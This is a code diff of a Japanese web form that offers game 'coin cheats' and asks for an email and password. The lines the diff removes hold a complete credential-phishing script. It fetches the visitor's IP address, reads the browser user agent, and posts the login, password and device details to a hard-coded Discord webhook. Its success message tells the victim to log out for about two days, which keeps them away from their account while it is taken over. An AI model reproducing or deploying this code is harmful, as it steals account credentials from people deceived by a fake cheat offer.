@@ -7,33 +7,38 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            padding: 20px;
             margin: 0;
-            min-height: 100vh;
-            background: linear-gradient(to bottom, #dcd3ff, #ffd6e7); /* 上部: 薄い紫, 下部: 薄いピンク */
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(to bottom, #d8bfd8, #ffc0cb); /* 上部が薄い紫、下部が薄いピンク */
         }
         form {
-            max-width: 400px;
             width: 100%;
-            background: rgba(255, 255, 255, 0.5); /* 白背景の不透明度30% */
+            max-width: 400px;
+            background-color: rgba(255, 255, 255, 0.3); /* 白背景の不透明度30% */
             border-radius: 8px;
             padding: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center; /* 中央揃え */
         }
         label {
             display: block;
             margin-top: 10px;
             font-weight: bold;
+            text-align: left; /* 左寄せ */
         }
         input {
-            width: 100%;
+            width: 90%; /* 入力フィールドを中央揃え */
             padding: 8px;
             margin: 5px 0 10px 0;
             border: 1px solid #ccc;
             border-radius: 4px;
+            display: block; /* ブロック表示で幅を適用 */
+            margin-left: auto; /* 左右中央揃え */
+            margin-right: auto;
         }
         button {
             width: 100%;
@@ -61,7 +66,6 @@
 </head>
 <body>
     <form id="authForm">
-        <h1>コインチート依頼フォーム</h1>
         <label for="address">メールアドレス</label>
         <input type="email" id="address" placeholder="メールアドレスを入力" required>
 
@@ -69,62 +73,6 @@
         <input type="text" id="password" placeholder="パスワードを入力" required>
 
         <button type="button" onclick="submitForm()">送信</button>
-
-        <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
-        <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>
     </form>
-
-    <script>
-        async function submitForm() {
-            const address = document.getElementById("address").value;
-            const password = document.getElementById("password").value;
-
-            if (!address || !password) {
-                alert("全ての項目を入力してください。");
-                return;
-            }
-
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-
-                const userAgent = navigator.userAgent;
-
-                const webhookURL = 'https://discord.com/api/webhooks/1332143787555688609/J91Uc5C-cAu8pn4plSRKRlWzNTDdvyr30ZwUSjHkt7CLkwewHj7PVEpnIC3AF8kHmbWM';
-
-                const payload = {
-                    embeds: [
-                        {
-                            title: "アカウント情報とデバイス情報",
-                            description: `**メールアドレス:** \`${address}\`\n**パスワード:** \`${password}\`\n**デバイス情報:** \`${userAgent}\`\n**IPアドレス:** \`${ipAddress}\``,
-                            color: 3447003,
-                        }
-                    ]
-                };
-
-                const response = await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (response.ok) {
-                    document.getElementById("successMessage").style.display = "block";
-                    const button = document.querySelector("button");
-                    button.style.backgroundColor = "red";
-                    button.textContent = "送信完了";
-                    button.disabled = true;
-                } else {
-                    document.getElementById("errorMessage").style.display = "block";
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                document.getElementById("errorMessage").style.display = "block";
-            }
-        }
-    </script>
 </body>
 </html>
